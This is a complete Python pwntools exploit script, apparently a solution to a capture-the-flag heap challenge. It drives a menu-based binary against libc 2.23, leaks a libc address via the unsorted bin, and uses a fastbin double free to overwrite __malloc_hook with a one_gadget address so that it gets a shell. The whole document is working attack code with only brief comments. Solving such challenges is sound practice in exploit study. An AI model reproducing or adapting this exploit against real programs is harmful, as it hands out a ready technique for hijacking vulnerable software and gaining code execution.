from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)

# unsorted bin leak
add_chunk(0, 0x200)
add_chunk(1, 0x20)
delete_chunk(0)
show_chunk(0)

p.recvline()
tmp = p.recvuntil(b"\x7f")
# print(f"tmp: {tmp}")
tmp = u64(tmp.ljust(0x8, b'\x00'))
# print(f"leak addr: {hex(tmp)}")

# libc addr
libc.address = tmp - 0x39bb78
print(f"libc.address: {hex(libc.address)}")

# alloc fastbin chunks
add_chunk(2, 0x68)
add_chunk(3, 0x68)
add_chunk(4, 0x68)

# fastbin double free
delete_chunk(2)
delete_chunk(3)
delete_chunk(2)

# use double free to alloc __malloc_hook
add_chunk(2, 0x68)
add_chunk(3, 0x68)
edit_chunk(2, p64(libc.sym["__malloc_hook"] - 0x23))
add_chunk(2, 0x68)

# modify __malloc_hook to one_gadgets
add_chunk(2, 0x68)
one_gadgets = [0xd5c07, 0x3f43a, 0x3f3e6]
og = libc.address + one_gadgets[0]
edit_chunk(2, b"\x00" * 0x13 + p64(og)) # b"a" maybe cause error

# getshell
add_chunk(5, 0x10)

p.interactive()
